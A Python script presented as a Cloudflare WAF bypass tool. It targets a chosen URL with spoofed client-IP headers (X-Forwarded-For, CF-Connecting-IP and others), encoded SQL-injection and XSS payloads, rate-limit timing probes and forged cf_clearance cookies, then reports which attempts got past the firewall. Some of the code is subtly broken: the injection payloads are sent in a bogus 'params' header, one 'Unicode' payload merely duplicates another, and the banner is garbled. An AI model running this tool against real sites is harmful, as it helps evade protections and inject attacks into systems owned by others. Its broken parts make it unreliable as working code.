#!/usr/bin/env python3
"""
Cloudflare WAF Bypass Tool

MITRE ATT&CK Mapping:
  T1203 - Exploitation for Client Execution
  T1059 - Command and Scripting Interpreter
  T1190 - Exploit Public-Facing Application

Tests IP rotation, JS challenge simulation, rate-limit fuzzing, and encoding
bypass techniques against Cloudflare-protected targets.
"""

import argparse
import json
import os
import random
import signal
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)
SHOULD_EXIT = False

BANNER = f"""{Fore.CYAN}
  ____ _       __ _       ___ _ _   _        ___ _ __ ___  ___ ___
 / ___| |     / /| |     |_ _| | | | |     / _ \\ '_ ` _ \\/ __/ __|
| |   | |    / / | |      | || | | | |    |  __/ | | | | \\__ \\__ \\
| |___| |___/ /  | |___   | || |_| | |___  \\___|_| |_| |_|___/___/
\\____|_____/_/   |_____|___|\\___/|_____|
{Fore.RESET}"""


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def do_get(url, timeout_sec, extra_headers=None, cookies=None):
    h = {"User-Agent": random.choice(AGENTS)}
    if extra_headers:
        h.update(extra_headers)
    try:
        return requests.get(url, headers=h, cookies=cookies or {}, timeout=timeout_sec)
    except requests.RequestException as e:
        return None


AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
]


def target_reachable(url):
    resp = do_get(url, 10)
    return resp is not None and resp.status_code < 500


def technique_ip_rotation(url, timeout_sec):
    results = []
    headers_pool = [
        {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-For": "10.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"}, {"CF-Connecting-IP": "203.0.113.50"},
        {"True-Client-IP": "127.0.0.1"}, {"True-Client-IP": "198.51.100.25"},
        {"X-Real-IP": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
    ]
    baseline = do_get(url, timeout_sec)
    if baseline is None:
        return [{"technique": "ip_rotation", "detail": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    for h in headers_pool:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, extra_headers=h)
        if resp is None:
            results.append({"technique": "ip_rotation", "headers": str(h), "bypassed": False, "error": "request_failed"})
        else:
            diff = abs(len(resp.text) - bl_len)
            bypassed = resp.status_code == 200 and (diff > 50 or resp.status_code != baseline.status_code)
            results.append({"technique": "ip_rotation", "headers": str(h), "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_encoding_bypass(url, timeout_sec):
    patterns = [
        ("URL SQLi", "' OR '1'='1"), ("Double URL SQLi", "%2527%2520OR%2520%25271%2527%253D%25271"),
        ("Unicode SQLi", "' OR '1'='1"), ("Mixed XSS", "<sCript>alert(1)</sCript>"),
        ("URL XSS", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"), ("Double URL XSS", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
        ("Null SQLi", "' OR '1'='1'%00"), ("Case SQLi", "UnIoN SeLeCt 1,2,3"),
        ("Hex SQLi", "0x27204f52202731273d27"),
    ]
    results = []
    for label, payload in patterns:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, extra_headers={"params": {"id": payload}})
        if resp is None:
            results.append({"technique": "encoding_bypass", "label": label, "bypassed": False, "error": "request_failed"})
        else:
            body = resp.text.lower()
            reflected = payload.lower()[:20] in body if len(payload) > 5 else False
            sql_err = any(kw in body for kw in ["sql", "mysql", "syntax", "unclosed", "quotation"])
            bypassed = resp.status_code == 200 and (reflected or sql_err)
            results.append({"technique": "encoding_bypass", "label": label, "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_rate_fuzzing(url, timeout_sec):
    results = []
    for delay in [1.0, 0.5, 0.2, 0.1, 0.05]:
        if SHOULD_EXIT:
            break
        statuses = []
        for _ in range(5):
            resp = do_get(url, timeout_sec)
            statuses.append(resp.status_code if resp else 0)
            time.sleep(delay)
        ok = sum(1 for s in statuses if s == 200)
        results.append({"technique": "rate_fuzzing", "delay": delay, "statuses": statuses, "bypassed": ok >= 3})
    return results


def technique_js_challenge(url, timeout_sec):
    results = []
    cookies_list = [
        {"cf_clearance": "simulated_clearance_token_abc123"},
        {"cf_clearance": "bypass_dummy_value"},
        {"__cfduid": "dummy", "cf_clearance": "test_clearance"},
    ]
    for ck in cookies_list:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, cookies=ck)
        if resp is None:
            results.append({"technique": "js_challenge", "cookies": str(ck), "bypassed": False, "error": "request_failed"})
        else:
            bypassed = resp.status_code == 200 and "Just a moment" not in resp.text
            results.append({"technique": "js_challenge", "cookies": str(ck), "status": resp.status_code, "bypassed": bypassed})
    return results


def run_techniques(url, timeout_sec, threads):
    print(f"\n{Fore.CYAN}[*] Target: {url}{Style.RESET_ALL}")
    if not target_reachable(url):
        print(f"{Fore.RED}[X] Target unreachable.{Style.RESET_ALL}")
        return []
    all_results = []
    techniques = [
        ("IP Rotation", technique_ip_rotation),
        ("Encoding Bypass", technique_encoding_bypass),
        ("Rate Fuzzing", technique_rate_fuzzing),
        ("JS Challenge", technique_js_challenge),
    ]
    with ThreadPoolExecutor(max_workers=threads) as ex:
        fmap = {ex.submit(fn, url, timeout_sec): name for name, fn in techniques}
        for f in as_completed(fmap):
            name = fmap[f]
            try:
                res = f.result()
                all_results.extend(res)
                b = sum(1 for r in res if r.get("bypassed"))
                print(f"{Fore.GREEN}[+] {name}: {b}/{len(res)} bypassed{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[X] {name} failed: {e}{Style.RESET_ALL}")
    return all_results


def print_report(results):
    if not results:
        return
    bypassed = [r for r in results if r.get("bypassed")]
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  CLOUDFLARE BYPASS | total={len(results)} bypassed={len(bypassed)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for r in bypassed:
        d = r.get("label") or r.get("headers") or r.get("cookies") or str(r.get("delay", ""))
        print(f"  {Fore.GREEN}[BYPASS] {r['technique']} | {d}{Style.RESET_ALL}")
    safe = [r for r in results if not r.get("bypassed")][:10]
    for r in safe:
        d = r.get("label") or r.get("headers") or r.get("cookies") or str(r.get("delay", ""))
        err = r.get("error", "")
        print(f"  {Fore.YELLOW}[BLOCKED] {r['technique']} | {d}{' (' + err + ')' if err else ''}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="Cloudflare WAF Bypass — MITRE T1203, T1059, T1190")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=4, help="Max threads")
    parser.add_argument("-o", "--output", help="Save JSON output")
    args = parser.parse_args()
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    results = run_techniques(args.url, args.timeout, args.threads)
    print_report(results)
    if args.output and results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] {sum(1 for r in results if r.get('bypassed'))} bypasses found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
